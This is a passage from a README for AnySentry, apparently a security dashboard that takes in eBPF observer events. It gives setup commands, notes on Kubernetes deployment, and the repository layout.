Requires Node 20+ and [pnpm](https://pnpm.io) (`corepack enable`).

```bash
pnpm install
pnpm dev          # api (29653) + web (5173, proxies /security-center → api) together
```

Open <http://localhost:5173>. Point `CLICKHOUSE_URL` at a local ClickHouse, or leave it unset to
run in-memory.

## Kubernetes

For a fleet, run `a3s-observer` as an observe-only eBPF DaemonSet on every node, forwarding events
to AnySentry. See [`deploy/`](deploy/) for example manifests (AnySentry + ClickHouse + the observer
DaemonSet) and the runbook.

## Layout

```
apps/api   NestJS — the sentry judge, ClickHouse store, aggregation, endpoints + SSE + ingest
apps/web   Rsbuild + React — the security dashboard
scripts/   a3s-observer → /ingest forwarders (Node + Python)
deploy/    example Kubernetes manifests + runbook
integrations/skills/  coding-agent skills, including anysentry-api
```

## License

[MIT](LICENSE)
